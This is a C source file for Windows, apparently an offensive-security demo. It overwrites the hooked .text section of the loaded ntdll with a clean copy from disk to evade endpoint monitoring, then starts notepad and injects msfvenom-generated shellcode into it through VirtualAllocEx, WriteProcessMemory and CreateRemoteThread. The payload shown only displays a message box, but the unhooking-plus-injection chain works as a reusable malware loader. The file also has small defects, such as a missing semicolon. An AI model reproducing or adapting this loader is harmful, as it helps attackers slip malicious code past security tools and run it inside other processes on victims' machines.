#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

/*
 * Replace the TEXT section of the loaded ntdll
 * with the TEXT section of the ntdll on disk
*/

#define NTD_PATH "C:\\Windows\\System32\\ntdll.dll"

#define warn(x) printf("%s : 0x%08X\n", x, GetLastError()); 

DWORD create_notepad(void);
BOOL unhook_ntdll(HMODULE ntdll_init, LPVOID ntdll_view);

int main(void)
{
    HANDLE      ntdll = INVALID_HANDLE_VALUE, ntdll_mapping = NULL;
    LPVOID      ntdll_view = NULL;
    HMODULE     ntdll_init = NULL;
    LPVOID      base;
    DWORD       notepad_pid, written;
    HANDLE      process, thread;

    // msfvenom --platform windows -p windows/x64/messagebox TEXT="shellcode execution" EXITFUNC=thread -f c
    unsigned char buf[327] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
        "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
        "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
        "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
        "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
        "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
        "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
        "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
        "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
        "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
        "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
        "\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
        "\x85\x2e\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
        "\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
        "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
        "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x73\x68\x65\x6c\x6c"
        "\x63\x6f\x64\x65\x20\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x00"
        "\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00";

    ntdll = CreateFileA(NTD_PATH, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (ntdll == INVALID_HANDLE_VALUE) {
        warn("CreateFileA fail");
        return 0;
    }

    // when we map it as an image, the dll is actually loaded for us
    ntdll_mapping = CreateFileMappingA(ntdll, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
    if (!ntdll_mapping) {
        warn("CreateFileMappingA fail");
        CloseHandle(ntdll);
        return 0;
    }

    ntdll_view = MapViewOfFile(ntdll_mapping, FILE_MAP_READ, 0, 0, 0);
    if (!ntdll_view) {
        warn("MapViewOfFile fail");
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        return 0;
    }

    ntdll_init = GetModuleHandleA("ntdll.dll");
    if (!ntdll_init) {
        warn("GetModuleHandleA fail");
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        UnmapViewOfFile(ntdll_view);
        return 0;
    }

    if (!unhook_ntdll(ntdll_init, ntdll_view)) {
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        UnmapViewOfFile(ntdll_view);
        return 0;
    }

    puts("Unhooked!");
    notepad_pid = create_notepad();
    if (!notepad_pid) {
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        UnmapViewOfFile(ntdll_view);
        return 0;
    }

    printf("[+] Notepad pid: %d\n", notepad_pid);

    process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, notepad_pid);
    if (!process) {
        warn("OpenProcess fail");
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        UnmapViewOfFile(ntdll_view);
        return 0;
    }

    base = (UINT64)VirtualAllocEx(process, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    if (!base) {
        warn("VirtualAllocEx fail")
        CloseHandle(process);
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        UnmapViewOfFile(ntdll_view);
        return 0;
    }

    if (!WriteProcessMemory(process, (LPVOID)base, (LPCVOID)buf, sizeof(buf), &written)) {
        warn("WriteProcessMemory fail");
        CloseHandle(process);
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        UnmapViewOfFile(ntdll_view);
        VirtualFreeEx(process, base, 0, MEM_RELEASE);
        return 0;
    }

    thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)base, NULL, 0, NULL);
    if (thread != NULL) {
        WaitForSingleObject(thread, 500);
        CloseHandle(thread);
    }

    CloseHandle(process);
    CloseHandle(ntdll);
    CloseHandle(ntdll_mapping);
    UnmapViewOfFile(ntdll_view);
    VirtualFreeEx(process, base, 0, MEM_RELEASE);
    return 0;
}

DWORD create_notepad(void)
{
    char                    cmdl[] = "C:\\Windows\\System32\\notepad.exe";
    STARTUPINFOA            si = { 0 };
    PROCESS_INFORMATION     pi = { 0 };
    BOOL                    res;

    si.cb = sizeof(STARTUPINFOA);

    res = CreateProcessA(
        cmdl, NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL,
        &si, &pi
    );

    if (!res) {
        puts("[-] Create notepad fail.");
        return 0;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    Sleep(2000);

    return pi.dwProcessId;
}

BOOL unhook_ntdll(HMODULE ntdll_init, LPVOID ntdll_view)
{
    LPVOID                  ntdll_init_addr = (LPVOID)ntdll_init;
    PIMAGE_DOS_HEADER       dos_header = (PIMAGE_DOS_HEADER)ntdll_init_addr;
    PIMAGE_NT_HEADERS       nt_header = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdll_init_addr + dos_header->e_lfanew);
    PIMAGE_SECTION_HEADER   section_header;
    DWORD                   old_protect;
    BOOL                    status;

    for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
        section_header = (PIMAGE_SECTION_HEADER)((ULONG_PTR)(IMAGE_FIRST_SECTION(nt_header)) + ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        if (strcmp((char *)section_header->Name, ".text"))
            continue;

        // found .text section
        status = (BOOL)VirtualProtect((ULONG_PTR)ntdll_init_addr + (ULONG_PTR)(section_header->VirtualAddress),
            section_header->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old_protect);
        if (!status) {
            warn("VirtualProtect fail");
            return status;
        }

        memcpy((ULONG_PTR)ntdll_init_addr + (ULONG_PTR)(section_header->VirtualAddress),
            (ULONG_PTR)ntdll_view + (ULONG_PTR)section_header->VirtualAddress, section_header->Misc.VirtualSize);

        status = (BOOL)VirtualProtect((ULONG_PTR)ntdll_init_addr + (ULONG_PTR)(section_header->VirtualAddress),
            section_header->Misc.VirtualSize, old_protect, &old_protect);
        if (!status) {
            warn("VirtualProtect fail");
            return status;
        }

        return TRUE;
    }

    // .text section not found 0.0
    return FALSE;
}